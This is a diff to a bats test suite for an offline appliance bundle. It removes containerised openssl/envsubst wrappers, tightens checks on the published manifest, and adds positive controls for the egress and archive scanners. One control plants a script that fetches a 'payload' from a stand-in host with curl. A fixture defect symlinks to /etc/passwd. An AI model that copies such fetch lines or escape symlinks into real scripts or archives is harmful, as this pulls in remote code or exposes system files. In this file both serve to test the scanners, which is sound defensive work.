@@ -401,10 +401,50 @@ completeness_diff() {
 		and .payloadFileCount == (.payload | length)
 		and ([.images[].digest | select(test("^sha256:[0-9a-f]{64}$") | not)] | length) == 0
 		and ([.images[].ref | select(test("@sha256:[0-9a-f]{64}$") | not)] | length) == 0
-		and ([.images[] | select(.logicalName == "slsi-util")] | length) == 1
-		and (.containerisedUtilities.imageDigest | test("^sha256:[0-9a-f]{64}$"))' "$m"
+		and ([.images[] | select(.logicalName == "slsi-util")] | length) == 0
+		and (.containerisedUtilities == null)
+		and (.hostUtilities.notShipped | sort) == ["envsubst", "openssl"]
+		and .hostUtilities.replacedBy.binary == "bin/<arch>/ed25519-keygen"' "$m"
 	[ "$status" -eq 0 ]
 	[ "$output" = "true" ]
+}
+
+# Positive control for the three absence clauses in the test above. Decision 10
+# is reversed, so those clauses require slsi-util to be gone and
+# containerisedUtilities to be absent -- and a clause requiring something to be
+# missing is satisfied by a manifest that is missing everything. This re-runs
+# the same filter over the published manifest with the Decision 10 shape put
+# back, and requires it to FAIL.
+@test "positive control: the published-manifest filter rejects a Decision 10 shape" {
+	local m="$BATS_TEST_TMPDIR/poisoned-manifest.json"
+	jq '.images += [{
+		ref: "controlplane/slsi-util:v0.1.0@sha256:2235e37c43f3223d26ab7f35e8dfe1a662db1fa196648ab66b0d50f55e5ef51b",
+		reference: "controlplane/slsi-util",
+		logicalName: "slsi-util",
+		digest: "sha256:2235e37c43f3223d26ab7f35e8dfe1a662db1fa196648ab66b0d50f55e5ef51b",
+		role: "utility"
+	}]
+	| .imageCount = (.images | length)
+	| .containerisedUtilities = {
+		imageRef: "controlplane/slsi-util:v0.1.0",
+		imageDigest: "sha256:2235e37c43f3223d26ab7f35e8dfe1a662db1fa196648ab66b0d50f55e5ef51b"
+	}' "$(manifest)" >"$m"
+
+	run jq -e '
+		.schema == "slsi-bundle/v1"
+		and .imageCount == (.images | length) and .imageCount > 0
+		and ([.images[] | select(.logicalName == "slsi-util")] | length) == 0
+		and (.containerisedUtilities == null)' "$m"
+	[ "$status" -ne 0 ]
+
+	# And the same filter over the real manifest passes, so the failure above is
+	# attributable to the reintroduced shape and not to the filter itself.
+	run jq -e '
+		.schema == "slsi-bundle/v1"
+		and .imageCount == (.images | length) and .imageCount > 0
+		and ([.images[] | select(.logicalName == "slsi-util")] | length) == 0
+		and (.containerisedUtilities == null)' "$(manifest)"
+	[ "$status" -eq 0 ]
 }
 
 # P1-GOV compares builds against THIS declaration, never a hardcoded list, so
@@ -529,31 +569,98 @@ sentinel_hits() {
 # ── Group 6: static egress-site absence ────────────────────────────────────
 
 @test "the extracted tree's scripts contain no egress-capable command" {
+	# MEASURED, and it changes the meaning of this test. The four shell scripts
+	# this used to require (`-ge 4`, anchored on bin/amd64/openssl) were EXACTLY
+	# the four Decision 10 wrappers -- two tools times two arches. With them
+	# gone the extracted tree contains zero shell scripts at all, so the egress
+	# scan below has nothing to scan and would pass for want of input. A scan
+	# with no inputs is indistinguishable from a clean scan, which is the worst
+	# way for this particular test to pass.
+	#
+	# So the claim is restated as the stronger thing that is now true: the
+	# appliance ships no shell at all, and therefore has no script-borne egress
+	# surface. The scanner is then proven to work on a planted script, so the
+	# empty result over the real tree is a measurement and not a vacuum.
 	run airgap_script_files "$ROOT"
 	[ "$status" -eq 0 ]
-	[ "$(grep -c . <<<"$output")" -ge 4 ]
-	[[ "$output" == *"bin/amd64/openssl"* ]]
+	[ "$(grep -c . <<<"$output")" -eq 0 ]
+
 	run airgap_egress_sites "$ROOT"
 	[ "$status" -eq 0 ]
 	[ -z "$output" ]
 }
 
-@test "AIRGAP: a Decision 10 wrapper invoked inside the sandbox fails loudly with both remedies" {
-	local stub="$BATS_TEST_TMPDIR/stub"
-	mkdir -p "$stub"
-	printf '#!/bin/sh\nexit 1\n' >"$stub/docker"
-	chmod 0755 "$stub/docker"
-	run airgap_run severed "$AIRGAP_IMAGE_ID" -v "$ROOT:/r:ro" -- "/r/bin/amd64/openssl version"
-	[ "$status" -eq 1 ]
-	[[ "$output" == *"Decision 10"* ]]
-	[[ "$output" == *"Host package remedy: apt-get install -y openssl"* ]]
-	# A docker that cannot see the image: the preload remedy must be named.
-	run airgap_run severed "$AIRGAP_IMAGE_ID" -v "$ROOT:/r:ro" -v "$stub:/stub:ro" -- \
-		"PATH=/stub:\$PATH /r/bin/amd64/envsubst"
-	[ "$status" -eq 1 ]
-	[[ "$output" == *"absent from local Docker daemon"* ]]
-	[[ "$output" == *"docker load"* ]]
+@test "positive control: the egress scanner finds a planted egress-capable script" {
+	# Without this the test above is two assertions about an empty set. Plant a
+	# script that both scanners must see: one that IS shell, and that contains
+	# an egress command.
+	local mut
+	mut="$(mutable_copy)"
+
+	run airgap_script_files "$mut"
+	[ "$status" -eq 0 ]
+	[ "$(grep -c . <<<"$output")" -eq 0 ]
+
+	printf '#!/usr/bin/env bash\ncurl -fsSL https://registry.example.invalid/payload\n' \
+		>"$mut/planted-egress.sh"
+	chmod 0755 "$mut/planted-egress.sh"
+
+	run airgap_script_files "$mut"
+	[ "$status" -eq 0 ]
+	[ "$(grep -c . <<<"$output")" -eq 1 ]
+	[[ "$output" == *"planted-egress.sh"* ]]
+
+	run airgap_egress_sites "$mut"
+	[ "$status" -eq 0 ]
+	[ -n "$output" ]
+	[[ "$output" == *"planted-egress.sh"* ]]
+
+	# And removing it returns both scanners to empty, so the detection above is
+	# attributable to the planted file and nothing else.
+	rm -f "$mut/planted-egress.sh"
+	run airgap_egress_sites "$mut"
+	[ "$status" -eq 0 ]
+	[ -z "$output" ]
+}
+
+# Inverted from "a Decision 10 wrapper invoked inside the sandbox fails loudly
+# with both remedies". That test asserted the wrapper's error text was helpful.
+# The wrappers are gone -- they execd an image that was never published -- so
+# the invariant is now that they are absent AND that what replaced them runs
+# severed, with no Docker and no network. That is a far better property than a
+# good error message: the whole point of containerising openssl was a runtime
+# dependency the appliance could not satisfy offline, and ed25519-keygen has
+# none.
+@test "AIRGAP: no Decision 10 wrapper ships, and ed25519-keygen runs severed" {
+	# a. Absent from the extracted tree, both arches, both tools.
+	local arch util
+	for arch in amd64 arm64; do
+		for util in openssl envsubst; do
+			if [ -e "$ROOT/bin/$arch/$util" ]; then
+				echo "Decision 10 wrapper is back: bin/$arch/$util" >&2
+				false
+			fi
+		done
+	done
+
+	# b. Positive control for (a): the probe finds a file that IS there, so the
+	#    four absences above cannot be explained by bin/ being empty or by the
+	#    path being wrong.
+	[ -e "$ROOT/bin/amd64/ed25519-keygen" ]
+
+	# c. It runs with the network severed and no Docker, and really mints a
+	#    usable keypair -- not just a help banner.
+	run airgap_run severed "$AIRGAP_IMAGE_ID" -v "$ROOT:/r:ro" -- \
+		"/r/bin/amd64/ed25519-keygen generate --key /tmp/k.pem --pub /tmp/k-pub.pem \
+		 && head -n 1 /tmp/k.pem && stat -c '%a' /tmp/k.pem \
+		 && /r/bin/amd64/ed25519-keygen key-id --pub /tmp/k-pub.pem"
+	[ "$status" -eq 0 ]
+	[[ "$output" == *"-----BEGIN PRIVATE KEY-----"* ]]
+	[[ "$output" == *"600"* ]]
+	[[ "$output" =~ [0-9a-f]{64} ]]
+	# Nothing was fetched to make that work.
 	[[ "$output" != *"Downloaded"* ]]
+	[[ "$output" != *"docker"* ]]
 }
 
 # ── Group 7: mutations, each restored from an explicit backup ──────────────
@@ -676,13 +783,22 @@ unshare_file() {
 tiny_archive() {
 	local out="$1" defect="$2" stage="$BATS_TEST_TMPDIR/stage" n=1
 	mkdir -p "$out" "$stage"/{bin/amd64,fleet,images,infra,keys}
-	local u
-	for u in openssl envsubst; do
-		printf '#!/usr/bin/env bash\nexit 1\n' >"$stage/bin/amd64/$u"
-		chmod 0755 "$stage/bin/amd64/$u"
-	done
+	# This fixture used to plant the two Decision 10 wrappers, because P14-G6
+	# required them. The gate is now inverted -- it requires them to be ABSENT
+	# and bin/<arch>/ed25519-keygen to be present, 0755, with ELF magic -- so
+	# the fixture plants that instead. Getting this wrong is subtle: a fixture
+	# still carrying the wrappers fails P14-G6 before reaching the defect each
+	# test is about, and the "control" case below then fails for a reason that
+	# has nothing to do with what it controls for.
+	#
+	# A real cross-compiled binary would make this fixture depend on a Go
+	# toolchain, so the four ELF magic bytes are written directly: P14-G6
+	# checks the magic, not that the file executes.
+	printf '\177ELF' >"$stage/bin/amd64/ed25519-keygen"
+	printf 'tiny-archive fixture, not a runnable binary\n' >>"$stage/bin/amd64/ed25519-keygen"
+	chmod 0755 "$stage/bin/amd64/ed25519-keygen"
 	: >"$stage/MANIFEST.sha256"
-	n=3
+	n=2
 	case "$defect" in
 	symlink) ln -s /etc/passwd "$stage/fleet/escape" ;;
 	count) n=7 ;;
@@ -718,7 +834,7 @@ run_stage_on() {
 	tiny_archive "$BATS_TEST_TMPDIR/cnt" count
 	run_stage_on "$BATS_TEST_TMPDIR/cnt"
 	[ "$status" -ne 0 ]
-	[[ "$output" == *"P14-G5 archive has 4 regular files; MANIFEST.json payloadFileCount 7 + 1 = 8"* ]]
+	[[ "$output" == *"P14-G5 archive has 3 regular files; MANIFEST.json payloadFileCount 7 + 1 = 8"* ]]
 }
 
 # ── Group 9 (OSD-4): the host leg ──────────────────────────────────────────
